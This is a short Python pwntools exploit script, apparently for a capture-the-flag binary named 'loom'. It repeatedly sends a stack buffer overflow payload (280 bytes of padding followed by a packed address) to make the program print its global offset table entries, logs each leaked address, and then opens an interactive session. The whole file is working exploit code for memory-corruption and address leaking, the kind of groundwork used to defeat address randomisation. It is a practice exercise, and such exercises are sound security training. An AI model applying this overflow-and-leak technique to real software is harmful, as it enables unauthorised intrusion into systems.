#!/usr/bin/env python3
from pwn import *

context.log_level = 'INFO' # Switch to DEBUG if you want to see all traffic

p = process('./loom')
e = ELF('./loom')
gdb.attach(p, gdbscript='continue')

gotEntries = { symbol:e.got[symbol] for symbol in e.got.keys() if '__' not in symbol}

for key, value in gotEntries.items():
    p.recvuntil(b'4) leave\n\n')
    p.sendline(b'1')
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.sendline((b'A' * 280 )+ p64(0x40232A) + (b'B' * 224))
    p.sendline(b'2')
    p.recv()
    p.sendline(b'3')
    p.recv()
    p.sendline(b'thisisnotthepassword') #emulated for our purposes
    p.recv()
    p.sendline(b'1')
    p.recvuntil(b'4) leave\n\n')
    p.sendline(b'1')
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.sendline((b'A' * 280 )+ p64(value) + (b'B' * 224))
    p.sendline(b'2')
    while True:
        raws = p.recv()
        data = b'ancient' in raws
        if data:
            break

    p.recvuntil(b'ancient : \n\n')
    leak = p.read(6).ljust(8, b'\0')
    log.info(f'Global Offset Table Leak for {key.ljust(8)} : {hex(u64(leak))}')

p.interactive()